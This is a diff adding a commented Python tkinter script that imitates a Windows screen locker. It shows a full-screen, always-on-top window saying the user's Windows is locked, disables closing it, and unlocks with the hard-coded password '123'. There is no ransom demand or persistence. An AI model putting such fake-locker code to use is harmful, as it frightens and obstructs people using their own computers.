@@ -1,0 +1,65 @@
+import sys
+from tkinter import *
+
+# Создаем главное окно
+root = Tk()
+
+# Настройки цвета
+bg_color = "black"
+fg_color = "red"
+root.configure(background=bg_color)
+
+# Делаем так, чтобы окно нельзя было закрыть стандартным образом (Alt+F4 / крестик)
+root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+# Поверх всех остальных окон
+root.attributes("-topmost", True)
+
+# Убираем рамки окна и иконку из панели задач
+root.overrideredirect(True)
+
+# Получаем размеры экрана и разворачиваем окно на весь экран
+width = root.winfo_screenwidth()
+height = root.winfo_screenheight()
+root.geometry(f"{width}x{height}+0+0")
+
+# Надпись "Ваш Windows заблокирован"
+label_title = Label(
+    root,
+    text="Ваш Windows заблокирован!",
+    font="Arial 30",
+    bg=bg_color,
+    fg=fg_color,
+)
+label_title.pack(pady=50)
+
+# Подпись для поля ввода
+label_subtitle = Label(
+    root,
+    text="Введите пароль для разблокировки:",
+    font="Arial 18",
+    bg=bg_color,
+    fg="white",
+)
+label_subtitle.pack(pady=10)
+
+# Поле ввода пароля
+password_entry = Entry(root, font="Arial 20", show="*")
+password_entry.pack(pady=10)
+
+
+# Функция проверки пароля
+def check_password():
+    # Правильный пароль
+    if password_entry.get() == "123":
+        sys.exit()
+
+
+# Кнопка разблокировки
+btn = Button(
+    root, text="Разблокировать", font="Arial 15", command=check_password
+)
+btn.pack(pady=10)
+
+# Запуск главного цикла программы
+root.mainloop()
